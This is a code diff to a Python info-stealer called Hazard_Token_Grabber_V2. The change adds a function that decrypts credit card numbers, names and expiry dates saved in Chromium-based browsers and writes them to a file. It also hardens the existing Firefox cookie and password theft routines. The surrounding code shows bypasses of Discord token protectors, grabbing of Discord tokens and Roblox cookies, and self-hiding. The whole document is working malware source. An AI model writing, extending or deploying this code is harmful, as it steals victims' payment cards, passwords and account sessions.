@@ -241,7 +241,7 @@ class Hazard_Token_Grabber_V2(functions):
         await self.bypassBetterDiscord()
         await self.bypassTokenProtector()
         function_list = [self.screenshot, self.grabTokens,
-                         self.grabRobloxCookie, self.grabCookies, self.grabPassword]
+                         self.grabRobloxCookie, self.grabCookies, self.grabPassword, self.creditInfo]
         if self.fetchConf('hide_self'):
             function_list.append(self.hide)
 
@@ -525,6 +525,7 @@ class Hazard_Token_Grabber_V2(functions):
                     conn.close()
                     os.remove(login)
 
+    @try_extract
     def firefoxCookies(self):
         path = self.roaming + '\\Mozilla\\Firefox\\Profiles'
         profiles = os.listdir(path)
@@ -745,6 +746,7 @@ class Hazard_Token_Grabber_V2(functions):
             return key, '1.2.840.113549.1.12.5.1.3'
         return None, None
 
+    @try_extract
     def firefoxPasswords(self):
         path = self.roaming + '\\Mozilla\\Firefox\\Profiles'
         profiles = os.listdir(path)
@@ -772,6 +774,51 @@ class Hazard_Token_Grabber_V2(functions):
                             ciphertext), 8), encoding="utf-8")
                         f.write(
                             f"Domain: {url}\nUser: {name}\nPass: {passw}\n\n")
+
+    @try_extract
+    def creditInfo(self):
+        for name, path in self.paths.items():
+            localState = path + '\\Local State'
+            if not os.path.exists(localState):
+                continue
+            profiles = self.findProfiles(name, path)
+            if profiles == []:
+                login_db = path + '\\Web Data'
+                profiles = [None]
+            for profile in profiles:
+                localState = path + '\\Local State'
+                if profile == 'def':
+                    login_db = path + '\\Web Data'
+                elif os.path.exists(path + "_side_profiles\\" + profile + '\\Web Data'):
+                    login_db = path + "_side_profiles\\" + profile + '\\Web Data'
+                    localState = path + "_side_profiles\\" + profile + '\\Local State'
+                    if not os.path.exists(localState):
+                        continue
+                elif profile == None:
+                    pass
+                else:
+                    login_db = path + f'{profile}\\Web Data'
+                if not os.path.exists(login_db):
+                    continue
+                with open(self.dir+f"\\{name} CreditInfo.txt", "a", encoding="cp437", errors='ignore') as f:
+                    master_key = self.get_master_key(localState)
+                    login = self.dir + self.sep + "Loginvault3.db"
+                    shutil.copy2(login_db, login)
+                    conn = sqlite3.connect(login)
+                    cursor = conn.cursor()
+                    cursor.execute(
+                        "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards")
+                    for r in cursor.fetchall():
+                        namee = r[0]
+                        exp1 = r[1]
+                        exp2 = r[2]
+                        decrypted_password = self.decrypt_val(r[3], master_key)
+                        if namee != "":
+                            f.write(
+                                f"Name: {namee}\nExp: {exp1}/{exp2}\nCC: {decrypted_password}\n\n")
+                    cursor.close()
+                    conn.close()
+                    os.remove(login)
 
     def neatifyTokens(self):
         f = open(self.dir+"\\Discord Info.txt",
